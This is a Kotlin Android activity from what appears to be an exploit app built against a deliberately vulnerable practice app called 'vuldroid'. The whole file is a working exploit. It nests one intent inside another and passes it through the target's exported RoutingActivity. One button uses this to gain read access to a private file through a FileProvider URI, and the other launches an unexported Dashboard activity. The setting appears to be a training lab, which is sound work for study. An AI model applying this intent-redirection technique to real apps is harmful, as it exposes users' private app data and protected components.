package vulndroid.exploit.app

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity

class AccessUnexportedComponents : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {

        // vuln exploited: Gaining access to arbitrary components
        super.onCreate(savedInstanceState)
        setContentView(R.layout.component_pwn_layout)

        val button8 = findViewById<Button>(R.id.button8)
        button8.setOnClickListener {
            Log.d("PWNAPP", "under construction")
            try {
                val routerIntent = Intent()
                routerIntent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                routerIntent.data = Uri.parse("content://com.vuldroid.application.provider/root/data/user/0/com.vuldroid.application/files/example.txt")
                routerIntent.setClassName("vulndroid.exploit.app", "vulndroid.exploit.app.ComponentExploit")

                Log.d("PWNAPP", "okay, pls work")
                val pwnIntent = Intent()
                pwnIntent.putExtra("router_component", routerIntent)
                pwnIntent.setClassName("com.vuldroid.application", "com.vuldroid.application.RoutingActivity")
                startActivity(pwnIntent)
            } catch (e: Exception) {
                Log.d("PWNAPP", "$e")
            }
        }

        val button9 = findViewById<Button>(R.id.button9)
        button9.setOnClickListener {
            val routerIntent = Intent()
            routerIntent.setClassName("com.vuldroid.application", "com.vuldroid.application.Dashboard")

            val pwnIntent = Intent()
            pwnIntent.putExtra("router_component", routerIntent)
            pwnIntent.setClassName("com.vuldroid.application", "com.vuldroid.application.RoutingActivity")
            startActivity(pwnIntent)
        }
    }
}